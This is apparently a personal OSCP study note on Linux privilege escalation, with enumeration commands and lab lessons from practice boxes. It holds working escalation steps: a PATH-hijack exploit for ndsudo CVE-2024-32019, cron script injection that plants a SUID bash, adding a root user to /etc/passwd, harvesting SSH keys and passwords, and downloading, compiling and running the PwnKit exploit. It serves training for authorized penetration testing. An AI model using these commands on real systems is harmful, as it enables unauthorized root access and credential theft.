---
tags: [methodology, linux, privesc, oscp]
---

# 04 — Linux Privilege Escalation

> Back to [[00 - Index (MOC)]]. Goal: low-priv user → `root`. Enumerate → match a vector → escalate.

## Enumerate (run these first)
```bash
id                    # groups — docker/lxd/disk/adm/netdata = privesc gold
sudo -l               # runnable as root (may need a password you have)
uname -a; cat /etc/os-release            # kernel + distro → exploit lookup
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
getcap -r / 2>/dev/null                   # capabilities (cap_setuid, etc.)
ss -tunlp                                 # TCP+UDP listening — local-only services (127.0.0.1 bind) invisible to nmap
ps aux                                    # running processes — root procs, custom scripts, passwords in cmdline args
crontab -l; cat /etc/crontab; ls -la /etc/cron.*
```
Automate: **linpeas.sh**, LinEnum, `pspy` (spot hidden root cron/processes). Tools: [[LinPEAS]] · [[LinEnum]].

---

## Pick the vector

| Finding | Vector | Tool / Ref |
|---------|--------|------------|
| `sudo -l` allows a binary | GTFOBins escape | ↓ sudo |
| SUID binary (non-standard) | GTFOBins SUID | ↓ SUID |
| Capability `cap_setuid+ep` etc. | capability abuse | GTFOBins caps |
| In `docker` group | mount host fs | ↓ groups |
| In `lxd`/`lxc` group | privileged container | ↓ groups |
| In `disk` group | raw read `/etc/shadow` | ↓ groups |
| In `netdata` group | ndsudo CVE-2024-32019 | ↓ netdata |
| Local-only service (127.0.0.1:port) | port-forward / curl locally, exploit version | ↓ local services |
| Root process with cleartext secret in args | reuse creds / hijack | ↓ local services |
| Writable cron/script run as root | overwrite payload | ↓ cron |
| Writable `/etc/passwd` or `/etc/shadow` | add root user | ↓ files |
| Password reuse / creds in files | `su` / SSH | ↓ loot |
| SUID `pkexec` present, unpatched host | PwnKit (CVE-2021-4034) | ↓ kernel/pkexec |
| Old kernel, nothing else | kernel exploit (last) | ↓ kernel/pkexec |

---

## sudo -l
```bash
sudo -l
# For each allowed binary → https://gtfobins.github.io  (search binary → "sudo")
sudo <binary> ...          # e.g. sudo vim -c ':!/bin/sh'
# Special cases:
sudo -u#-1 <cmd>           # CVE-2019-14287 runas bypass
LD_PRELOAD / LD_LIBRARY_PATH if env_keep set
sudo <binary>              # if version < 1.9.5p2 → Baron Samedit (CVE-2021-3156)
```

## SUID / SGID
```bash
find / -perm -4000 -type f 2>/dev/null
# Non-standard binary → GTFOBins "SUID" section
# Custom SUID binary → run `strings`/`ltrace` for a relative-path command call → PATH hijack
```

## Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid → e.g. python: os.setuid(0); os.system('/bin/sh')
```

## Dangerous group memberships
```bash
# docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd/lxc → import alpine, launch privileged, mount host (see HackTricks)
# disk → debugfs /dev/sda1 → read /root, /etc/shadow
# adm → read /var/log (creds, tokens)
```

### netdata group → root (CVE-2024-32019)  *(Editor box)*
`ndsudo` is setuid-root and resolves helper binaries (`nvme`,`megacli`…) via **$PATH** → hijack:
```bash
find / -name ndsudo 2>/dev/null && ls -la <path>/ndsudo    # confirm setuid root
mkdir /tmp/x
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /tmp/x/nvme
chmod +x /tmp/x/nvme
export PATH=/tmp/x:$PATH
<path>/ndsudo nvme-list
/tmp/rootbash -p       # euid=0
```
> **Lesson (Editor):** being in a service group (`netdata`) *is* the vector — check `id` groups against known CVEs, not just SUID/sudo.

## Local services & processes
```bash
ss -tunlp                       # TCP+UDP, listening + owning PID/process
ps aux                          # full process list — check EVERY row, not just top
ps auxww                        # don't truncate long cmdlines (passwords/tokens hide here)
watch -n1 ps aux                # or pspy64 — catch short-lived processes cron spawns
```
**Why it's often missed:** nmap only sees what's exposed externally. A DB, admin panel, or debug service bound to `127.0.0.1` is invisible to the external scan but reachable locally once you have a shell — curl it directly, or SSH `-L` port-forward it out if it needs a browser.
- Odd/high port in `ss -tunlp` owned by root → check the binary/version for a known CVE, or just hit it: `curl localhost:<port>`
- `ps aux` cmdline column → app launched with `--password=`, `-p`, `DB_PASS=` etc. in plaintext; also reveals what config file a process is actually reading (may differ from the one you already read)
- Cross-reference with the SQLite/db creds you already found — services often reuse the same DB password for an admin/internal service

## Cron abuse
```bash
cat /etc/crontab; ls -la /etc/cron.*; pspy64      # find root jobs
# If the script or its dir is writable → inject:
echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> /path/root_script.sh
# wildcard injection (tar/rsync with *) → checkpoint/e= tricks (GTFOBins)
```
> **Lesson (archiver box):** Check the perms of the script a cron entry **calls**, not just the cron file. A root-only `/etc/cron.hourly/archiver` chained to a `777` `/var/archives/archive.sh` → append payload, wait <60s, `/tmp/rb -p`. Follow every cron one hop deeper. Also: a job firing far more often than its crontab suggests (every minute from a `cron.hourly`) means someone moved it to a **personal crontab** — `pspy64` reveals these when `/etc/cron*` doesn't.

## Writable sensitive files
```bash
# /etc/passwd writable → add root user
openssl passwd -1 -salt x pass                        # → hash
echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd; su r00t
```

## Credential loot
```bash
cat ~/.bash_history ~/.mysql_history 2>/dev/null
cat ~/.ssh/id_rsa; ls -la ~/.ssh
grep -riE "password|secret|token" /home /var/www /opt /etc 2>/dev/null | head
find / -name ".*" -type f 2>/dev/null | grep -vE "/proc/|/sys/"
```
⚠️ Search hidden files with `~/.` or `find ~ -name ".*"` — **never** `grep -r ~/.*` (glob climbs out of home). Then `su <user>` / SSH with reused creds.

## Kernel exploit (last resort) & pkexec/PwnKit fallback
```bash
uname -r; cat /etc/os-release                 # exact build + distro
searchsploit "linux kernel <distro> <ver> Local Privilege Escalation"
gcc exploit.c -o exploit                       # compile ON TARGET (-o matters; a 2nd .c = extra source file, not output)
```
Kernel exploits are brittle — expect two failure modes before they ever land:
- **Hardcoded offsets** don't match the build → `something went wrong`. Don't Ctrl-C (kernel panic).
- **Mitigation gates it** → `cat /proc/sys/kernel/unprivileged_bpf_disabled` = `1` kills every eBPF exploit (CVE-2017-16995/45010: `failed to create bpf map: Operation not permitted`).

**Prefer a userspace SUID bug.** If `find / -perm -4000` lists `/usr/bin/pkexec` on an unpatched host → **PwnKit (CVE-2021-4034)**, kernel-independent and unaffected by BPF/SMEP:
```bash
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c -O PwnKit.c   # RAW url, not the blob page
gcc PwnKit.c -o PwnKit && ./PwnKit            # run as the low-priv user, NOT sudo
# self-contained alt: searchsploit -m 50689
```
> **Lesson (Ubuntu 16.04 box):** when all 3 kernel exploits failed (offset mismatch + `unprivileged_bpf_disabled=1`), SUID `pkexec`/PwnKit was the clean root. Run the SUID scan *before* reaching for kernel exploits. `undefined reference to main` while compiling = you fetched the HTML blob page, not the raw `.c` (`head -5` to check).

---

## Stabilize your shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z → stty raw -echo; fg → export TERM=xterm
```
More: [[07 - Shells & File Transfers]] · [[penelope]].

---

## References
- GTFOBins: https://gtfobins.github.io
- HackTricks Linux privesc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- linpeas: https://github.com/peass-ng/PEASS-ng · pspy: https://github.com/DominicBreuker/pspy
